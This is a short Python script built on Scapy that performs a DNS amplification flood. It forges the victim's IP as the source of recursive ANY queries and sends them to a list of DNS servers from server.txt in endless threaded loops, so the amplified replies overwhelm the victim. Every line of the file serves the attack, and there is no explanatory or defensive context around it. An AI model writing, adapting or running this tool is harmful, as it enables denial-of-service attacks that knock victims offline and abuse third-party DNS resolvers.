#!/usr/bin/python3
from scapy.all import *
import sys
import _thread


def dns_flood(victim_ip, dns_server):
    try:
        while True:
            send(IP(src=victim_ip, dst=str(dns_server))/UDP(dport=53)/DNS(rd=1, qdcount=1, qd=DNSQR(qname='baidu.com', qtype=255)), verbose=0)
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print('./dns.py [victim_ip] [thread_num]')
        sys.exit()
    
    victim_ip = str(sys.argv[1])
    thread_num = int(sys.argv[2])

    f = open('server.txt', 'r')
    for x in range(0, thread_num):
        for dns_server in f:
            _thread.start_new_thread(dns_flood, (victim_ip, dns_server.strip()))
    while True:
        pass
